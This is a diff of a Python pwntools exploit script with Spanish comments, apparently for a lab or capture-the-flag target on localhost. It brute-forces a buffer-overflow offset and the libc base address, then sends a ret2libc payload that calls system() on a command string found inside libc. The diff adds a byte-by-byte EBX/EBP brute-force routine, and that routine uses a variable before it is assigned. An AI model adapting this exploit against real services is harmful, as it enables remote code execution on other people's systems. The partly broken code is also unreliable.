@@ -6,7 +6,7 @@ from pwn import *
 HOST = "localhost"
 PORT = 9999
 
-def generar_direcciones_libc(base_start= 0xf7f00000 , base_end=0xf7000000, page_size=-0x1000):
+def generar_direcciones_libc(base_start= 0xf7cc0000, base_end=0xf7dc0000, page_size=0x1000):
     return [addr for addr in range(base_start, base_end, page_size)]
     
 def send_payload(payload_data):
@@ -41,7 +41,7 @@ def calcular_offset():
     """
     # This is a placeholder function. The actual implementation will depend on the target binary.
     # For example, you might want to use gdb or another tool to find the correct offset.
-    i = 60
+    i = 69
     while True:
         # print(f"Trying offset: {i}")
         PAYLOAD = b"A" * i
@@ -49,18 +49,30 @@ def calcular_offset():
         if not RESPONSE:
             print(f"[+] GOT IT: offset = {i}")
             return i-1
-            break
         time.sleep(0.1)
         i += 1
-    
-    return 
+
+
+def byte_for_byte_ebx_and_ebp(offset):
+    payload = b"A" * offset
+    for _ in range(0, 16):
+        for i in range(0, 16):
+            p = payload + bytes(i)
+            print(f"Trying: {p}")
+            response = send_payload(p)
+            if response:
+                print(f"[+] GOT IT: ebp = {hex(i)}")
+                ebp_ebx += struct.pack("<I", i)
+                payload = p
+                break;
+    return ebp_ebx
 
 offset = calcular_offset()
 
-libc = ELF("/lib32/libc.so.6", checksec=False)  # usa la misma que el servidor
+libc = ELF("/usr/lib32/libc.so.6", checksec=False)  # usa la misma que el servidor
 system_offset = libc.symbols["system"]
 exit_offset = libc.symbols["exit"]
-command_offset = 0x18dc9b + 0x9 #next(libc.search(b"ls")) 
+command_offset = next(libc.search(b"/etc/shells")) + 0x9  #  Te quedas con el "ls" de shells para ejecutar el comando
 
 print(f"system_offset: {hex(system_offset)}")
 print(f"exit_offset: {hex(exit_offset)}")
@@ -71,14 +83,15 @@ libc_base_guesses = generar_direcciones_libc()
 print(f"Guesses: {len(libc_base_guesses)}")
 
 for base in libc_base_guesses:
-    system = struct.pack("<I",(base + system_offset))       # 0xf7e12360)
-    exit_addr = struct.pack("<I",(base + exit_offset))      # 0xf7e04ec0)
-    command  = struct.pack("<I", (base + command_offset))   # 0xf7e12360)
+    system = struct.pack("<I",(base + system_offset))
+    exit_addr = struct.pack("<I",(base + exit_offset))
+    command  = struct.pack("<I", (base + command_offset))
 
-    PAYLOAD = b"A" * offset
+    PAYLOAD = b"A" * offset + b"BBBBBBBB"
+    # PAYLOAD += ebp
     PAYLOAD += system
     PAYLOAD += exit_addr
-    PAYLOAD += command
+    PAYLOAD += command + b"\x00"
 
     print(f"Base: {hex(base)} - System: {hex(base + system_offset)} - exit: {hex(base + exit_offset)} - command: {hex(base + command_offset)}")
 
@@ -86,6 +99,5 @@ for base in libc_base_guesses:
 
     if RESPONSE:
         print(f"[+] GOT IT: base = {base}")
-        break
     time.sleep(0.1)
 print("[+] Finished wihout success")
